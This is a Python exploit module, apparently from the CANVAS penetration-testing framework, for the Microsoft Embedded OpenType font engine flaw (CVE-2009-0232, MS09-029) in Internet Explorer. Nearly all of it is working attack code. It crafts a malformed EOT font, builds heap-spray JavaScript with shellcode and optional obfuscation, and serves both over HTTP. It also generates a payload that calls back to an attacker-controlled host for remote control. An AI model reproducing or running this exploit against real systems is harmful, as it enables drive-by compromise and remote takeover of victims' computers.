#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2009
#http://www.immunityinc.com/CANVAS/ for more information

import sys
if '.' not in sys.path: sys.path.append('.')

from struct import *
from exploitutils import *
from shellcode import shellcodeGenerator
import canvasengine
from tcpexploit import tcpexploit
from httpclientside import httpclientside

NAME='Microsoft Embedded OpenType Font Engine Vulnerability'
DESCRIPTION='Microsoft Embedded OpenType Font Engine Vulnerability'

DOCUMENTATION={}
DOCUMENTATION['Vendor']='Microsoft'
DOCUMENTATION['Datepublic']='07/14/2009'
DOCUMENTATION['Repeatability']='One shot'
DOCUMENTATION['References']='http://www.microsoft.com/technet/security/Bulletin/MS09-029.mspx'
DOCUMENTATION['CVE Name']='CVE-2009-0232'
DOCUMENTATION['CVE Url']='http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-0232'
DOCUMENTATION['Notes']='Tested against a Windows XP SP2 & SP3 English, German & Simplified Chinese with IE 6. IE 7 asks for confirmation before executing the object code.'

PROPERTY={}
PROPERTY['TYPE']='DoS'
PROPERTY['SITE']='Client Side'
PROPERTY['ARCH']=[['Windows']]
PROPERTY['VERSION']=['2000', 'XP','2003']
PROPERTY['MSADV']='MS09-029'
PROPERTY['DELIVERY']='HTTP'

NOTES="""
http://www.microsoft.com/technet/security/bulletin/ms09-029.mspx

To test from command line:
     bash-3.00$ ./commandlineInterface.py -v 1 -p 5555
     bash-3.00$ ./exploits/httpserver/httpserver.py -O singleexploit:ms09_029 -l 10.10.10.208 -p 8080 -d 5555
"""

CHANGELOG="""
"""

targets={
    0: ['Autoversioning',0],
    1: ['Windows XP, 2003',0x0c0c0c0c],
}

class theexploit(tcpexploit,httpclientside):
    def __init__(self):
        tcpexploit.__init__(self)
        httpclientside.__init__(self)
        self.searchMethod=self.FindBrowser_FindAnyTag_CmpExtraInfo
        self.UserAgent=[('Mozilla/','MSIE','')]
        self.version=1
        self.badstring='\0\xff'
        self.name=NAME
        self.filename='index.html'
        self.listenerArgsDict['fromcreatethread']=0
        self.obfuscate=False        
        return

    def displayVersions(self):
        for v in self.versions.keys():
            print 'Version %d: %s'%(v,self.versions[v][0])

    def neededListenerTypes(self):
        return [canvasengine.WIN32MOSDEF]

    def createShellcode(self):
        httpWrapper=''
        try:
            if self.HTTPMOSDEF==True:
                self.log('[!] Using HTTP MOSDEF tunneling payload')
                sc=shellcodeGenerator.win32()
                sc.addAttr('findeipnoesp',{'subespval':0x400})
                sc.addAttr('revert_to_self_before_importing_ws2_32',None)
                if self.useSSLMOSDEF==True:
                    ssl='s'
                else:
                    ssl=''
                sc.addAttr('httpGetShellcode',{'URL':'http%s://%s:%d'%(ssl,self.callback.ip,self.callback.port)})
                httpWrapper=sc.get()
                self.log('[!] HTTP MOSDEF len: %d bytes'%(len(httpWrapper)))
        except Exception,msg:
            #print 'Exception in HTTP MOSDEF Payload generation: %s' % msg
            httpWrapper=''
        self.shellcode=self.createInjectToSelf(self.callback.ip,self.callback.port,injectme=httpWrapper)
        return self.shellcode

    def run(self):
        self.host=self.target.interface
        self.filename=self.argsDict.get('filename',self.filename)
        filedata=self.makefile()
        self.log('Opening %s for output'%self.filename)
        fd=file(self.filename,'wb+')
        fd.write(filedata)
        fd.close()
        self.log('Wrote to %s'%self.filename)
        return 1

    def javascript_encode(self):        
        js="""
var nndx='%'+'u9'+'0'+'9'+'0'+'%u'+'9'+'0'+'9'+'0';
var shell=unescape(nndx+"SHELLCODE");
var headersize=20;
var block=unescape(nndx);
var slackspace=headersize+shell.length;
while(block.length<slackspace)
    block+=block;
extra=block.substring(0,slackspace);
bigblock=block.substring(0,block.length-slackspace);
while(bigblock.length+slackspace<0x30000)
    bigblock=bigblock+bigblock+extra;
memory=new Array();
for(x=0;x<400;x++)
    memory[x]=bigblock+shell;
"""  
        js=js.replace('SHELLCODE',urluencode(self.shellcode))        
        self.obfuscate=self.argsDict.get('obfuscate',self.obfuscate)
        if self.obfuscate:
            self.log('Obfuscating javascript code.')
            js=self.obfuscate_javascript(js)
        return js

    def makefile(self):        
        filedata="""<HTML>
<HEAD>
<META HTTP-EQUIV="Content-Type" CONTENT="text/html; CHARSET=UTF-8">
<TITLE>Test</TITLE>
<STYLE TYPE="text/css"> 
<!--
@font-face {
                font-family: plop;
                font-style:  normal;
                font-weight: normal;
                src: url(font.eot);
                }

H1 { font-family: "plop"; 
font-weight: normal;
font-size: 24pt; 
color: #AA2222; }
-->
</STYLE>

</HEAD>
<BODY BGCOLOR=#000000>
<CENTER>

<span id='DivID' />
<script language='javascript'>JAVASCRIPT</script>
<H1>HACK FONT</H1>

</CENTER>
</BODY>
</HTML>
"""
        javascript=self.javascript_encode()
        filedata=filedata.replace('JAVASCRIPT',javascript)
        return filedata

    def makesploit(self,clientheader,clientbody):
        from libs.spkproxy import header,body
        h=header('SERVER')
        b=body()
        if clientheader.URL.count(self.filename):
            self.shellcode=self.createShellcode()
            sploitstring=self.makefile()
            b.setBody(sploitstring)
            h.addHeader('Content-Type','text/html')
        elif clientheader.URL.count('font.eot'):
            h.addHeader('Content-Type','application/octet-stream')
            name_record = pack('>HHHHHH',
                               0x3,    # platormID
                               0x1,    # encodingID
                               0x409,  # languageID
                               0x1,    # nameID
                               0xfffe,   # stringLength
                               0x0) # offset form start of storage area

            count = 1

            name_table = pack(">HHH",
                              0, # format
                              count, # count
                              3*4 + len(name_record)*count) # stringOffset

            name_table = name_table + name_record + '\x0c' * 0x10004 # (6 bytes for padding)

            # offset subtable
            offset_subtable = pack('>LHHHH',
                                   0x74727565,   # scaler type (true)
                                   1,         # numTables
                                   0x8000,    # searchRange
                                   0x0300,    # entrySelector
                                   0x0060)    # rangeShift

            # table directory
            table_directory = pack('>LLLL',
                                   0x6e616d65, # tag ('name')
                                   0x41414141, # checkSum
                                   0x1C,       # offset
                                   0xffffffff) # length

            ttf = offset_subtable + table_directory + name_table

            eot = pack('<LLL10sBBLHHLLLLLLLLLLLHH8sHH8sHH8sHH8sHH8s',
                       len(ttf),     # FontDataSize
                       0x00020001,   # Version
                       0,            # Flags (no compression)
                       '\x02\x02\x09\x04\x07\x03\x0b\x02\x04\x01', # FontPANOSE
                       0,            # Charset
                       0,            # Italic
                       0x1009,       # Weight
                       0x8,          # fsType
                       0x504C,       # MagicNumber
                       1,            # UnicodeRange1
                       0,            # UnicodeRange2
                       0,            # UnicodeRange3
                       0,            # UnicodeRange4
                       0x40000001,   # CodePageRange1
                       0,            # CodePageRange2
                       0x207f0a81,   # CheckSumAdjustment
                       0,            # Reserved1
                       0,            # Reserved2
                       0,            # Reserved3
                       0,            # Reserved4
                       0,            # padding1
                       8,            # FamilyNameSize
                       'B\0B\0B\0B\0',
                       0,            # padding2
                       8,            # StyleNameSize
                       'C\0C\0C\0C\0',
                       0,            # padding3
                       8,            # VersionNameSize
                       'D\0D\0D\0D\0',
                       0,            # padding4
                       8,            # FullNameSize
                       'E\0E\0E\0E\0',
                       0,            # padding5
                       8,            # RootStringSize
                       'h\0t\0t\0p\0') + ttf     # FontData (file, http)

            data = pack('<L', len(eot)+4) + eot

            b.setBody(data)
        else:
            self.log('redirecting to self')
            h.status='302'
            h.addHeader('Location',self.filename)
            h.addHeader('Content-Type','text/html')
        return h,b

if __name__=='__main__':
    print 'Running CANVAS %s Exploit v %s'%(DESCRIPTION,VERSION)
    app=theexploit()
    ret=standard_callback_commandline(app)
